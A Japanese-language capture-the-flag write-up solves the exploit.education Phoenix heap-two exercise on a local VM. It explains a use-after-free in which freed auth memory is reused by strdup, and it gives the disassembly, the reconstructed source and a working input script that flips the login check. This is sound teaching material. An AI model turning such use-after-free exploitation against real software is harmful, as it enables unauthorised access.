# Phoenix heap-two write-up

対象:

- 接続: `ssh -F /dev/null -p 2223 user@localhost`
- パスワード: `user`
- バイナリ: `/home/user/heap/heap-two`
- 環境: amd64 Phoenix, setuid/setgid ELF, non-PIE, executable stack

## 参考資料

- 引用:url https://exploit.education/phoenix/heap-two/

公式ページでソースの意図と成功条件を確認した。バイナリ内の実アドレス、`malloc` 再利用の様子、最終入力列は VM 内で確認した。

## 初学者向けの解き方

この問題で最初に立てる目的は、「プログラムが何を成功条件としているか」を見つけること。`heap-two` は `winner()` に飛ばす問題ではなく、`login` の条件分岐を満たす問題だった。

まず、バイナリの文字列を見てコマンド名と成功メッセージを探す。

```sh
strings -a /home/user/heap/heap-two | sed -n '1,160p'
```

重要な出力:

```text
auth
reset
service
login
you have logged in already!
please enter your password
```

ここから「対話式に `auth`, `reset`, `service`, `login` を入力するプログラム」だと分かる。次に、どの条件で `you have logged in already!` が出るかを `objdump` で読む。

```sh
objdump -d -M intel /home/user/heap/heap-two | sed -n '/<main>:/,/^$/p'
```

`login` 付近で見るべき命令はここ。

```asm
mov rax, QWORD PTR [rip+...]   ; auth
test rax, rax                  ; auth != NULL ?
je fail
mov rax, QWORD PTR [rip+...]   ; auth
mov eax, DWORD PTR [rax+0x20]  ; *(int *)(auth + 0x20)
test eax, eax                  ; auth->auth != 0 ?
je fail
call puts                      ; "you have logged in already!"
```

この時点で成功条件は次の 2 つだと分かる。

```text
auth != NULL
*(int *)(auth + 0x20) != 0
```

次に `auth` コマンドを読む。目的は「`auth + 0x20` が何か」を理解すること。

```asm
malloc(0x24)
memset(auth, 0, 0x24)
strlen(input_after_auth) <= 0x1e
strcpy(auth, input_after_auth)
```

`0x24` byte 確保していて、`login` は offset `0x20` を見ている。これは典型的に次の構造体。

```c
struct auth {
    char name[32];  // 0x20 bytes
    int auth;       // offset 0x20
};
```

ただし `auth` 入力は `strlen(line + 5) <= 0x1e` に制限されているので、`auth` コマンドだけでは offset `0x20` まで届かない。ここで「別の方法で同じ chunk を書けないか」を探す。

次に `reset` を読む。ここが脆弱性。

```asm
mov rax, QWORD PTR [rip+...]  ; auth
mov rdi, rax
call free@plt
```

`free(auth)` するだけで、`auth = NULL` にしていない。つまり `auth` は解放済み chunk を指し続ける。

最後に `service` を読む。

```asm
strdup(line + 7)
service = returned_pointer
```

`strdup` は内部で `malloc` して入力文字列をコピーする。もし `reset` で解放した `auth` chunk が再利用されれば、`service` の文字列で `auth` の中身を書ける。

この仮説を実際に検証する。

```sh
python3 - <<'PY' | /home/user/heap/heap-two
print('auth a')
print('reset')
print('service ' + 'A' * 32 + 'B')
print('login')
PY
```

出力:

```text
[ auth = 0, service = 0 ]
[ auth = 0x600e40, service = 0 ]
[ auth = 0x600e40, service = 0 ]
[ auth = 0x600e40, service = 0x600e40 ]
you have logged in already!
```

判断ポイントは `auth` と `service` が同じ `0x600e40` になっていること。これは `service` が `reset` 後の `auth` chunk を再利用した証拠。

payload の意味:

```text
service + 'A' * 32 + 'B'
```

`'A' * 32` が `name[32]` を埋める。次の `B` が offset `0x20`、つまり `auth->auth` の先頭 byte に入る。`0x42` は非ゼロなので `login` が成功する。

## 観察

`heap-two` は対話式にコマンドを受け取る。

```text
Welcome to phoenix/heap-two, brought to you by https://exploit.education
[ auth = %p, service = %p ]
```

主なグローバル変数:

```text
auth    = 0x600e10
service = 0x600e18
```

`main` の重要部分は以下。

```c
if (!strncmp(line, "auth ", 5)) {
    auth = malloc(0x24);
    memset(auth, 0, 0x24);

    if (strlen(line + 5) <= 0x1e) {
        strcpy(auth, line + 5);
    }
}

if (!strncmp(line, "reset", 5)) {
    free(auth);
}

if (!strncmp(line, "service", 6)) {
    service = strdup(line + 7);
}

if (!strncmp(line, "login", 5)) {
    if (auth && *(int *)(auth + 0x20)) {
        puts("you have logged in already!");
    } else {
        puts("please enter your password");
    }
}
```

`login` は `auth` が NULL ではなく、かつ `auth + 0x20` の 4 byte が非ゼロなら成功する。

## 探索ログ

まずバイナリの種類と `main` の分岐を確認した。

```sh
file /home/user/heap/heap-two
readelf -h /home/user/heap/heap-two | egrep 'Type|Entry'
readelf -s /home/user/heap/heap-two | egrep ' main$'
objdump -d -M intel /home/user/heap/heap-two | sed -n '/<main>:/,/^$/p'
strings -a /home/user/heap/heap-two | sed -n '1,160p'
```

`strings` では `auth`, `reset`, `service`, `login`, `you have logged in already!` が見える。`objdump` で追うと、各コマンドは `strncmp` で判定されていた。

`auth` コマンドでは `malloc(0x24)` したあと `memset(..., 0, 0x24)` する。これは公式ソースの `struct auth { char name[32]; int auth; }` と一致する。`name` が 32 byte、直後の `int auth` が offset `0x20` にある。

`reset` コマンドは次だけを実行する。

```asm
mov rax, QWORD PTR [rip+...]  ; auth
mov rdi, rax
call free@plt
```

`auth = NULL` に戻す処理がないので、ここで dangling pointer が残る。

実際に入力を流して pointer 表示を確認した。

```sh
python3 - <<'PY' | /home/user/heap/heap-two
print('auth a')
print('reset')
print('service ' + 'A' * 32 + 'B')
print('login')
PY
```

実行中の表示は次のように変わった。

```text
[ auth = 0, service = 0 ]
[ auth = 0x600e40, service = 0 ]
[ auth = 0x600e40, service = 0 ]
[ auth = 0x600e40, service = 0x600e40 ]
```

`reset` 後も `auth` は `0x600e40` のままで、`service` の `strdup` が同じ `0x600e40` を再利用している。これで `auth` と `service` が同じ chunk を指すことが分かった。

## 脆弱性

`reset` は `free(auth)` するだけで、`auth = NULL` にしない。そのため `auth` は解放済み chunk を指す dangling pointer になる。

その後 `service ...` を実行すると、`strdup` が同じサイズ帯の chunk を再利用しやすい。実際に次の順で `auth` と `service` は同じアドレスになった。

```text
[ auth = 0x600e40, service = 0 ]
[ auth = 0x600e40, service = 0 ]
[ auth = 0x600e40, service = 0x600e40 ]
```

つまり、`service` の文字列で、解放済み `auth` 構造体の中身を上書きできる。

## 解法

`auth + 0x20` を非ゼロにすればよいので、`service` に 32 byte の padding と 1 byte の非ゼロ値を入れる。

```text
offset 0x00: service string
offset 0x20: login が検査する int
```

試行として `service A` のような短い文字列では `auth + 0x20` までは届かず、`login` は失敗する。`service ` の後ろに 32 byte ちょうど padding を置き、その次に `B` を置くと、`auth->auth` の最初の byte が `0x42` になり、`int` として非ゼロになる。

## 最終 exploit

SSH 先で実行する。

```sh
python3 - <<'PY' | /home/user/heap/heap-two
print('auth a')
print('reset')
print('service ' + 'A' * 32 + 'B')
print('login')
PY
```

成功時の出力:

```text
Welcome to phoenix/heap-two, brought to you by https://exploit.education
[ auth = 0, service = 0 ]
[ auth = 0x600e40, service = 0 ]
[ auth = 0x600e40, service = 0 ]
[ auth = 0x600e40, service = 0x600e40 ]
you have logged in already!
[ auth = 0x600e40, service = 0x600e40 ]
```

## まとめ

この問題の本質は heap overflow ではなく use-after-free。

`free(auth)` 後にポインタを NULL にしていないため、後続の `strdup` で同じ chunk を再利用させると、`auth` と `service` が同じ heap 領域を指す。最後に `auth + 0x20` を非ゼロにして `login` する。

## 試行錯誤の要点

この問題では制御フロー hijack は不要だった。最初に `winner` のような関数を探したが、`heap-two` には成功用関数がなく、`login` 分岐の条件を満たす問題だった。

重要だった確認は、`reset` 後に `auth` の表示が 0 にならないことと、`service` が同じアドレスを取ること。ここが確認できれば、あとは `struct auth` の offset `0x20` へ非ゼロを書くだけになる。
